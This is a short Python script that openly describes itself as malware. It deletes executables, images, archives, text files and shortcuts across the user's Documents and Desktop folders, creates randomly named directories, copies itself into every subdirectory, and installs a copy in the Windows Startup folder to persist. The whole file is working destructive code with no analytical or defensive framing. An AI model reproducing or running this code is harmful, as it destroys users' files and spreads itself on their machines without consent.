import os
import shutil
import random
import string

# Define function to generate random string for file names
def random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

# Define function to delete specified file types in a directory
def delete_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(('.exe', '.png', '.zip', '.rar', '.txt', '.lnk')):
                os.remove(os.path.join(root, file))

# Define function to create 10 directories with random names in a directory
def create_directories(directory):
    for i in range(10):
        directory_name = random_string(10)
        os.makedirs(os.path.join(directory, directory_name))

# Delete specified file types in Documents and Desktop directories
delete_files(os.path.join(os.path.expanduser("~"), "Documents"))
delete_files(os.path.join(os.path.expanduser("~"), "Desktop"))

# Create 10 directories with random names in Documents and Desktop directories
create_directories(os.path.join(os.path.expanduser("~"), "Documents"))
create_directories(os.path.join(os.path.expanduser("~"), "Desktop"))

# Define function to drop the malware in all directories
def drop_malware(directory):
    malware_path = os.path.realpath(__file__)
    malware_name = random_string(10) + ".py"
    malware_destinations = []
    for root, dirs, files in os.walk(directory):
        for dir in dirs:
            malware_destinations.append(os.path.join(root, dir))
    for destination in malware_destinations:
        malware_destination = os.path.join(destination, malware_name)
        shutil.copy2(malware_path, malware_destination)

# Drop the malware in all directories in Documents and Desktop
drop_malware(os.path.join(os.path.expanduser("~"), "Documents"))
drop_malware(os.path.join(os.path.expanduser("~"), "Desktop"))

# Define function to add malware to startup folder
def add_to_startup():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Start Menu\Programs\Startup')
    malware_path = os.path.realpath(__file__)
    malware_name = random_string(10) + ".py"
    malware_destination = os.path.join(startup_folder, malware_name)
    shutil.copy2(malware_path, malware_destination)

# Add malware to startup folder
add_to_startup()
